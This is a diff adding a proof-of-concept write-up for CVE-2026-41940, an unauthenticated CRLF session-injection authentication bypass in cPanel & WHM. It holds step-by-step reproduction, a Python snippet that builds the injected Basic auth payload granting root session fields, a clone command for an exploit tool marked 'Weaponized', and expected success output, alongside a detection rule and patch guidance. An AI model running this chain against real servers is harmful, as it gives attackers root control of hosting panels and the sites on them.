@@ -1,0 +1,162 @@
+
+<!-- 
+  File: 2026-05-16_cpanel-whm-auth-bypass-crlf-session-injection.md
+  Location: pocs/web/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-16 |
+| **Author / Researcher** | ynsmroztas (Mitsec) |
+| **CVE / Advisory** | CVE-2026-41940 |
+| **Category** | web |
+| **Severity** | Critical |
+| **CVSS Score** | 10.0 (CVSSv3) |
+| **Status** | Weaponized |
+| **Tags** | auth-bypass, CRLF-injection, session-poisoning, cPanel, WHM, unauthenticated |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | cPanel & WHM |
+| **Versions Affected** | 110.x ≤ 11.110.0.96, 118.x ≤ 11.118.0.62, 126.x ≤ 11.126.0.53, 132.x ≤ 11.132.0.28, 134.x ≤ 11.134.0.19, 136.x ≤ 11.136.0.4 |
+| **Language / Platform** | Perl backend (`Session.pm`) / Linux hosting panels |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2026-41940 is a critical unauthenticated authentication bypass in cPanel & WHM. The vulnerable session handling flow writes attacker-controlled `Authorization: Basic` data to the session file before sanitization, allowing CRLF injection of trusted session fields. By poisoning values such as `hasroot=1`, `user=root`, and `tfa_verified=1`, a remote attacker can obtain root-level WHM access without valid credentials.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+In the vulnerable flow, `saveSession()` writes raw session data to disk and only then calls `filter_sessiondata()`. Because CRLF characters from a crafted Basic authorization value are preserved during write, additional key/value lines are injected into the on-disk session file and later parsed as legitimate session state.
+
+### Attack Vector
+
+An unauthenticated attacker sends a crafted authentication sequence against exposed WHM/cPanel endpoints. The exploit chain mints a preauth session, performs CRLF injection via the `Authorization` header, triggers propagation (`do_token_denied` gadget), and finally verifies privileged API access through `/json-api/version`.
+
+### Impact
+
+Successful exploitation yields full WHM root-session context on vulnerable targets. This enables privileged administrative actions such as account enumeration, command execution via WHM API, and credential modifications, resulting in complete panel compromise.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux (attacker host with Python 3.8+)
+Target:      Internet-exposed cPanel & WHM (vulnerable versions)
+Attacker:    Authorized security testing host
+Tools:       Python stdlib, cPanelSniper.py
+```
+
+### Setup Steps
+
+```bash
+git clone https://github.com/ynsmroztas/cPanelSniper
+cd cPanelSniper
+python3 cPanelSniper.py --help
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Discover canonical target hostname** using the OpenID redirect endpoint.
+2. **Mint preauth session** by posting invalid credentials to `/login/?login_only=1` and capturing the returned `whostmgrsession` cookie.
+3. **Inject CRLF payload** through a crafted `Authorization: Basic` header while reusing the minted session.
+4. **Trigger session propagation** with `/scripts2/listaccts` so injected raw session fields are consumed by cache logic.
+5. **Verify bypass** by requesting `/cpsess*/json-api/version` and observing successful privileged API response.
+
+### Exploit Code
+
+> See `cPanelSniper.py` in this folder.
+
+```python
+import base64
+
+payload = (
+    "root:x\r\n"
+    "successful_internal_auth_with_timestamp=9999999999\r\n"
+    "user=root\r\n"
+    "tfa_verified=1\r\n"
+    "hasroot=1"
+)
+
+header_value = "Basic " + base64.b64encode(payload.encode()).decode()
+print(header_value)
+```
+
+### Expected Output
+
+```
+[PWND] CVE-2026-41940 CONFIRMED — WHM root access!
+[PWND]   Token    : /cpsessXXXXXXXXXX
+[PWND]   API URL  : https://target:2087/cpsessXXXXXXXXXX/json-api/version
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/` — add authorized lab captures of bypass and privileged API response
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http any any -> $HTTP_SERVERS 2087 (
+  msg:"Possible cPanel CVE-2026-41940 CRLF session injection";
+  content:"Authorization|3a| Basic "; http_header;
+  content:"/scripts2/listaccts"; http_uri;
+  sid:9401940; rev:1;
+)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade to fixed releases: 11.110.0.97, 11.118.0.63, 11.126.0.54, 11.132.0.29, 11.134.0.20, or 11.136.0.5+ |
+| **Workaround** | Restrict WHM/cPanel management interfaces to trusted IP ranges and enforce access through VPN/jump hosts |
+| **Config Hardening** | Monitor and block malformed Basic auth headers containing CR/LF patterns; alert on anomalous `whostmgrsession` usage |
+
+---
+
+## References
+
+- [CVE-2026-41940 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-41940)
+- [cPanel Security Update 04/28/2026](https://support.cpanel.net/hc/en-us/articles/40073787579671-cPanel-WHM-Security-Update-04-28-2026)
+- [watchTowr Labs analysis](https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/)
+- [Source Repository — ynsmroztas/cPanelSniper](https://github.com/ynsmroztas/cPanelSniper)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/ynsmroztas/cPanelSniper on 2026-05-16.
+
